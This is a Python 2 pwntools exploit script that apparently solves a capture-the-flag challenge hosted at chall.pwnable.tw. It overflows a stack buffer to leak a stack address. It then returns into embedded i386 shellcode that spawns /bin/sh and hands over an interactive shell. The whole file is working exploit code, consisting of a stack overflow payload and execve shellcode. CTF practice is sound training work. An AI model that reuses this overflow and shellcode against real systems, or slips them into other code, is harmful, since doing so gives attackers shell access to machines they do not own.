#!/usr/bin/env python2

from pwn import *

p = remote('chall.pwnable.tw', 10000)
context.log_level = 'debug'
context.arch = 'i386'

#first stage (leak stack)
payload = 'A'*0x14 + p32(0x08048087)
p.recvuntil("Let's start the CTF:")
p.send(payload)
#print p.recv(4)
esp = u32(p.recv(4))
print '[+]Stack at:{}'.format(hex(esp))

#second stage
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = 'A'*0x14 + p32(esp + 0x14) + shellcode 
p.sendline(payload)

p.interactive()
p.close()
 
